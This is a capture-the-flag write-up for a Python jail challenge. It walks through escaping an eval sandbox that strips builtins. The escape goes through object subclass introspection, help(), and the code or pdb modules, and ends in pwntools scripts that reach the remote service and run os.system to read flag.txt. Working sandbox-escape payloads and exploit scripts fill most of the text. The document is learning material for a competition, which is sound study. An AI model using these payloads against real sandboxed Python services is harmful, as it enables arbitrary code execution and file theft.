# Michael Scottfield

```
T-Bag: "You think you’re the smartest man in the room?"

Michael: "No. But I don’t need to be. I just need to be the one with the plan."

Flag is in flag.txt.

nc 0.cloud.chals.io 33618
```

Attachment:

```python
def check_pattern(user_input):
    """
    This function will check if numbers or strings are in user_input.
    """
    return '"' in user_input or '\'' in user_input or any(str(n) in user_input for n in range(10))


while True:
    user_input = input(">> ")

    if len(user_input) == 0:
        continue

    if len(user_input) > 500:
        print("Too long!")
        continue

    if not __import__("re").fullmatch(r'([^()]|\(\))*', user_input):
        print("No function calls with arguments!")
        continue

    if check_pattern(user_input):
        print("Numbers and strings are forbbiden")
        continue

    forbidden_keywords = ['eval', 'exec', 'import', 'open']
    forbbiden = False
    for word in forbidden_keywords:
        if word in user_input:
            forbbiden = True

    if forbbiden:
        print("Forbbiden keyword")
        continue

    try:
        output = eval(user_input, {"__builtins__": None}, {})
        print(output)
    except:
        print("Error")
```

This is a python jail challenge. I did not solve it in the competition, but learnt how to solve it after the competition ends. Here are the solutions on the Discord:

@hibwyli:

```python
[t:=True+True+True+True+True+True+True+True+True+True,f:=t*t+t+t+t+t+t,e:=True+True+True+True+True,().__class__.__base__.__subclasses__()[f+t-True]()()] 
pdb
sandbox
[s:=True+True+True,t:=True+True+True+True+True+True+True+True+True+True,f:=t*t+t+t+t+t+t,e:=True+True+True+True+True,a:=().__class__.__base__.__subclasses__()[f+t-True].__doc__,().__class__.__base__.__subclasses__()[f+t-True-True].__init__.__globals__[a[t+t+t+e]+a[t+t+t+t+t+e+s]+a[t+t+t+e]].modules[a[t+t+s]+a[t+t+t+t+t+e]+a[t+True]].set_trace()]
"".__class__.__base__.__subclasses__()[141].__init__.__globals__["__builtins__"]["__import__"]("os").system("cat flag.txt")
```

@Phisher:

```python
[m.help()for B in[().__class__.__base__]for L in[[].__class__.__name__]for x in B.__subclasses__()if x.__init__.__class__.__name__[False]==().__format__.__name__[True+True]for G in[x.__init__.__globals__]if L[True+True]+B.__class__.__name__[True]+L[True+True]in G for S in[G[L[True+True]+B.__class__.__name__[True]+L[True+True]]]for m in S.modules.values()if m.__name__==[].__class__.__module__][False]
pdb
sandbox
[S.modules[B.__class__.__name__[True+True]+G.__class__.__name__[False]+B.__name__[True]].set_trace() for B in[().__class__.__base__] for L in[[].__class__.__name__] for x in B.__subclasses__() if x.__init__.__class__.__name__[False]==().__format__.__name__[True+True] for G in[x.__init__.__globals__] if L[True+True]+B.__class__.__name__[True]+L[True+True] in G for S in[ G[L[True+True]+B.__class__.__name__[True]+L[True+True]] ]][False]
# enters pdb prompt
```

@(ztz:

```python
[y:=().__doc__,ww:=True,z:=ww+ww,t:=z+z+z+z+z+z+z+z+z+ww,zt:=t+t+t+t+t+t+t+t+z+z+z+ww,a:=().__class__.__base__.__subclasses__,w:=a()[zt]()(),a()[ww-ww-ww-ww-ww].__subclasses__()[False]().interact()]
# enters help prompt

https://github.com/mmm-team/public-writeups/blob/d592f318b5daa813b89d4b1bae323862fda911de/seccon2024/jail_1linepyjail/README.md?plain=1#L15
```

This is my first time to learn python jail escape. Here is the detailed attack sequence learned from [1linepyjail - Jail Problem writeup](https://github.com/mmm-team/public-writeups/blob/d592f318b5daa813b89d4b1bae323862fda911de/seccon2024/jail_1linepyjail/README.md?plain=1#L15):

1. enter the help() function
2. load new module, e.g. code or pdb, and execute function from the newly module to achieve RCE

## Step 1. enter the help() function

So the first thing is to invoke the help() function. It can be found in :

```python
>> ().__class__.__base__.__subclasses__()
[..., <class '_sitebuiltins._Helper'>, ...]
```

We can find its index:

```python
from pwn import *

p = remote("0.cloud.chals.io", 33618)
p.recvuntil(b">> ")
p.sendline(b"().__class__.__base__.__subclasses__()")
res = p.recvline().decode()
print(res.split(", ").index("<class '_sitebuiltins._Helper'>"))
```

Output is 159. So we need to access 159 of the array. But, we cannot use digits directly. Instead, we use `True` as if we have integers:

```python
>> [A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,C:=A+A+A+A+A,D:=A+B+C-True]
# A=10, B=10*10=100, C=10*5=50, D=10+100+50-1=159
[10, 100, 50, 159]
```

Now that `D` is `159`, we can access the `<class '_sitebuiltins.Helper'>` and call it twice to invoke `help()`:

```python
>> [A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,C:=A+A+A+A+A,D:=A+B+C-True,().__class__.__base__.__subclasses__()[D]]
[10, 100, 50, 159, <class '_sitebuiltins._Helper'>]
>> [A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,C:=A+A+A+A+A,D:=A+B+C-True,().__class__.__base__.__subclasses__()[D]()]
[10, 100, 50, 159, Type help() for interactive help, or help(object) for help about object.]
>> [A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,C:=A+A+A+A+A,D:=A+B+C-True,().__class__.__base__.__subclasses__()[D]()()]
>> [A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,C:=A+A+A+A+A,D:=A+B+C-True,().__class__.__base__.__subclasses__()[D]()()]
Welcome to Python 3.12's help utility! If this is your first time using
Python, you should definitely check out the tutorial at
https://docs.python.org/3.12/tutorial/.

Enter the name of any module, keyword, or topic to get help on writing
Python programs and using Python modules.  To get a list of available
modules, keywords, symbols, or topics, enter "modules", "keywords",
"symbols", or "topics".

Each module also comes with a one-line summary of what it does; to list
the modules whose name or summary contain a given string such as "spam",
enter "modules spam".

To quit this help utility and return to the interpreter,
enter "q" or "quit".

help> 
```

So the first step is done. Actually, if pager is available (e.g. locally), we can get shell using `!/bin/sh` in pager:

```shell
$ python3
Python 3.13.5 (main, Jun 25 2025, 18:55:22) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
Ctrl click to launch VS Code Native REPL
>>> help()
Welcome to Python 3.13's help utility! If this is your first time using
Python, you should definitely check out the tutorial at
https://docs.python.org/3.13/tutorial/.

Enter the name of any module, keyword, or topic to get help on writing
Python programs and using Python modules.  To get a list of available
modules, keywords, symbols, or topics, enter "modules", "keywords",
"symbols", or "topics".

Each module also comes with a one-line summary of what it does; to list
the modules whose name or summary contain a given string such as "spam",
enter "modules spam".

To quit this help utility and return to the interpreter,
enter "q", "quit" or "exit".

help> subprocess
# in the pager, input !/bin/sh to get shell
$ 
```

However, it does not work remotely. Therefore, we need more steps.

## Step 2. load new module, and execute function from the newly module to achieve RCE

There are different approachs to achieve RCE:

1. code.InteractiveConsole().interact()
2. pdb.set_trace()

### Use code module

First, let's try the first option. After launching `help()`, enter `code` to load it and enter `quit` to return to the shell:

```python
from pwn import *

context(log_level = "debug")

p = remote("0.cloud.chals.io", 33618)
p.recvuntil(b">> ")
p.sendline(b"[A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,C:=A+A+A+A+A,D:=A+B+C-True,().__class__.__base__.__subclasses__()[D]()()]")
p.recvuntil(b"help> ")
p.sendline(b"code")
p.sendline(b"quit")
p.interactive()
```

Now the next thing is to execute `code.InteractiveConsole().interact()`. Since we don't have builtins, we need to use `sys.modules["code"]` to locate `code` module. But where is `sys`? we can find it in `_sitebuiltins._Printer`. We can find its index just as we did for `_sitebuiltins._Helper`:

```python
from pwn import *

context(log_level = "debug")

p = remote("0.cloud.chals.io", 33618)
p.recvuntil(b">> ")
p.sendline(b"().__class__.__base__.__subclasses__()")
res = p.recvline().decode()
print("Helper", res.split(", ").index("<class '_sitebuiltins._Helper'>"))
print("Printer", res.split(", ").index("<class '_sitebuiltins._Printer'>"))
```

It is 158, so we can locate it in a similar way:

```python
>> [A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,C:=A+A+A+A+A,D:=A+B+C-True,().__class__.__base__.__subclasses__()[D-True]]
[10, 100, 50, 159, <class '_sitebuiltins._Printer'>]
```

We can find `sys` in its `__init__.__globals__`:

```python
>> [A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,C:=A+A+A+A+A,D:=A+B+C-True,().__class__.__base__.__subclasses__()[D-True].__init__.__globals__]
[..., {..., 'sys': <module 'sys' (built-in)>, ...}]
```

Then, we need to find two strings for `sys.modules["code"]`: `"sys"` and `"code"`. Remember we have access to `__doc__`, and we can use arbitrary characters in there:


```python
>> [A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,C:=A+A+A+A+A,D:=A+B+C-True,().__class__.__base__.__subclasses__()[D].__doc__]
[10, 100, 50, 159, "Define the builtin 'help'.\n\n    This is a wrapper around pydoc.help that provides a helpful message\n    when 'help' is typed at the Python interactive prompt.\n\n    Calling help() at the Python prompt starts an interactive help session.\n    Calling help(thing) prints help for the python object 'thing'.\n    "]
>> [A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,C:=A+A+A+A+A,D:=A+B+C-True,S:=().__class__.__base__.__subclasses__()[D].__doc__,S[A+A+A+C]+S[C+A-True-True]+S[A+A+A+C],S[C+A+True]+S[C+True+True]+S[C+True+True+True+True+True]+S[True]]
# the indices can be found locally via __doc__.index(ch)
[10, 100, 50, 159, "Define the builtin 'help'.\n\n    This is a wrapper around pydoc.help that provides a helpful message\n    when 'help' is typed at the Python interactive prompt.\n\n    Calling help() at the Python prompt starts an interactive help session.\n    Calling help(thing) prints help for the python object 'thing'.\n    ", 'sys', 'code']
```

Then we can call `code.InteractiveConsole().interact()`:

```python
>> [A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,C:=A+A+A+A+A,D:=A+B+C-True,S:=().__class__.__base__.__subclasses__()[D].__doc__,().__class__.__base__.__subclasses__()[D-True].__init__.__globals__[S[A+A+A+C]+S[C+A-True-True]+S[A+A+A+C]].modules[S[C+A+True]+S[C+True+True]+S[C+True+True+True+True+True]+S[True]]]
[10, 100, 50, 159, "Define the builtin 'help'.\n\n    This is a wrapper around pydoc.help that provides a helpful message\n    when 'help' is typed at the Python interactive prompt.\n\n    Calling help() at the Python prompt starts an interactive help session.\n    Calling help(thing) prints help for the python object 'thing'.\n    ", <module 'code' from '/usr/local/lib/python3.12/code.py'>]
```

Remember to load `code` module in the previous step, otherwise it will fail. Eventually, we get an interactive shell to do anything:

```python
>> [A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,C:=A+A+A+A+A,D:=A+B+C-True,S:=().__class__.__base__.__subclasses__()[D].__doc__,().__class__.__base__.__subclasses__()[D-True].__init__.__globals__[S[A+A+A+C]+S[C+A-True-True]+S[A+A+A+C]].modules[S[C+A+True]+S[C+True+True]+S[C+True+True+True+True+True]+S[True]].InteractiveConsole().interact()]
# this is the interactive console
>>>
```

Everything required to send:

```python
[A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,C:=A+A+A+A+A,D:=A+B+C-True,().__class__.__base__.__subclasses__()[D]()()]
code
quit
[A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,C:=A+A+A+A+A,D:=A+B+C-True,S:=().__class__.__base__.__subclasses__()[D].__doc__,().__class__.__base__.__subclasses__()[D-True].__init__.__globals__[S[A+A+A+C]+S[C+A-True-True]+S[A+A+A+C]].modules[S[C+A+True]+S[C+True+True]+S[C+True+True+True+True+True]+S[True]].InteractiveConsole().interact()]
import os
os.system("cat flag.txt")
```

Attack script:

```python
from pwn import *

context(log_level = "debug")

p = remote("0.cloud.chals.io", 33618)
p.recvuntil(b">> ")
p.sendline(b"().__class__.__base__.__subclasses__()")
res = p.recvline().decode()
print("Helper", res.split(", ").index("<class '_sitebuiltins._Helper'>"))
print("Printer", res.split(", ").index("<class '_sitebuiltins._Printer'>"))

p.recvuntil(b">> ")
p.sendline(b"[A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,C:=A+A+A+A+A,D:=A+B+C-True,().__class__.__base__.__subclasses__()[D]()()]")
p.recvuntil(b"help> ")
p.sendline(b"code")
p.sendline(b"quit")

p.recvuntil(b">> ")
p.sendline(b"[A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,C:=A+A+A+A+A,D:=A+B+C-True,S:=().__class__.__base__.__subclasses__()[D].__doc__,().__class__.__base__.__subclasses__()[D-True].__init__.__globals__[S[A+A+A+C]+S[C+A-True-True]+S[A+A+A+C]].modules[S[C+A+True]+S[C+True+True]+S[C+True+True+True+True+True]+S[True]].InteractiveConsole().interact()]")
p.recvuntil(b">>> ")
p.sendline(b"import os")
p.sendline(b"os.system(\"cat flag.txt\")")
p.interactive()
```

Fully automated attack script to generate the indices:

```python
from pwn import *

context(log_level="debug")

p = remote("0.cloud.chals.io", 33618)
p.recvuntil(b">> ")
p.sendline(b"().__class__.__base__.__subclasses__()")
res = p.recvline().decode()

helper_index = res.split(", ").index("<class '_sitebuiltins._Helper'>")
printer_index = res.split(", ").index("<class '_sitebuiltins._Printer'>")
print("Helper", helper_index)
print("Printer", printer_index)

# A is 10, B is 100


def get_index(index):
    if index % 10 <= 5:
        parts = (
            ["True"] * (index % 10)
            + ["A"] * (index // 10 % 10)
            + ["B"] * (index // 100 % 10)
        )
        return "+".join(parts)
    else:
        parts = ["A"] * (index // 10 % 10 + 1) + ["B"] * (
            index // 100 % 10
        )
        return "+".join(parts) + "-" + "-".join(["True"] * (10 - index % 10))


# H for index of helper
helper = get_index(helper_index)
print(helper)

p.recvuntil(b">> ")
p.sendline(
    b"[A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,H:="
    + helper.encode()
    + b",().__class__.__base__.__subclasses__()[H]()()]"
)
p.recvuntil(b"help> ")
p.sendline(b"code")
p.recvuntil(b"help> ")
p.sendline(b"quit")

# find help text of helper
p.recvuntil(b">> ")
p.sendline(
    b"[A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,H:="
    + helper.encode()
    + b",S:=().__class__.__base__.__subclasses__()[H].__doc__]"
)
help_text = eval(p.recvline().decode())[-1]

# P for index of printer

printer = get_index(printer_index)
print(printer)


# synthesize "sys" and "code"
def synthesize(text):
    res = []
    for ch in text:
        index = help_text.index(ch)
        res.append("S[" + get_index(index) + "]")
    return "+".join(res)


p.recvuntil(b">> ")
p.sendline(
    b"[A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,H:="
    + helper.encode()
    + b",P:="
    + printer.encode()
    + b",S:=().__class__.__base__.__subclasses__()[H].__doc__,().__class__.__base__.__subclasses__()[P].__init__.__globals__["
    + synthesize("sys").encode()
    + b"].modules["
    + synthesize("code").encode()
    + b"].InteractiveConsole().interact()]"
)
p.recvuntil(b">>> ")
p.sendline(b"import os")
p.sendline(b'os.system("cat flag.txt")')
p.interactive()
```

### Use pdb module

The attack using pdb is similar: we only need to call `pdb.set_trace()`:

```python
from pwn import *

context(log_level="debug")

p = remote("0.cloud.chals.io", 33618)
p.recvuntil(b">> ")
p.sendline(b"().__class__.__base__.__subclasses__()")
res = p.recvline().decode()

helper_index = res.split(", ").index("<class '_sitebuiltins._Helper'>")
printer_index = res.split(", ").index("<class '_sitebuiltins._Printer'>")
print("Helper", helper_index)
print("Printer", printer_index)

# A is 10, B is 100


def get_index(index):
    if index % 10 <= 5:
        parts = (
            ["True"] * (index % 10)
            + ["A"] * (index // 10 % 10)
            + ["B"] * (index // 100 % 10)
        )
        return "+".join(parts)
    else:
        parts = ["A"] * (index // 10 % 10 + 1) + ["B"] * (index // 100 % 10)
        return "+".join(parts) + "-" + "-".join(["True"] * (10 - index % 10))


# H for index of helper
helper = get_index(helper_index)
print(helper)

p.recvuntil(b">> ")
p.sendline(
    b"[A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,H:="
    + helper.encode()
    + b",().__class__.__base__.__subclasses__()[H]()()]"
)
p.recvuntil(b"help> ")
p.sendline(b"pdb")
p.recvuntil(b"help> ")
p.sendline(b"quit")

# find help text of helper
p.recvuntil(b">> ")
p.sendline(
    b"[A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,H:="
    + helper.encode()
    + b",S:=().__class__.__base__.__subclasses__()[H].__doc__]"
)
help_text = eval(p.recvline().decode())[-1]

# P for index of printer

printer = get_index(printer_index)
print(printer)


# synthesize "sys" and "pdb"
def synthesize(text):
    res = []
    for ch in text:
        index = help_text.index(ch)
        res.append("S[" + get_index(index) + "]")
    return "+".join(res)


p.recvuntil(b">> ")
p.sendline(
    b"[A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,H:="
    + helper.encode()
    + b",P:="
    + printer.encode()
    + b",S:=().__class__.__base__.__subclasses__()[H].__doc__,().__class__.__base__.__subclasses__()[P].__init__.__globals__["
    + synthesize("sys").encode()
    + b"].modules["
    + synthesize("pdb").encode()
    + b"].set_trace()]"
)
p.recvuntil(b"(Pdb) ")
p.sendline(
    (
        '().__class__.__base__.__subclasses__()['
        + str(printer_index)
        + '].__init__.__globals__["sys"].modules["os"].system("cat flag.txt")'
    ).encode()
)
p.interactive()
```

Adapt the script above to load `pdb` module instead. Then, we can execute what we want freely.

## Explain the writeups above

TODO
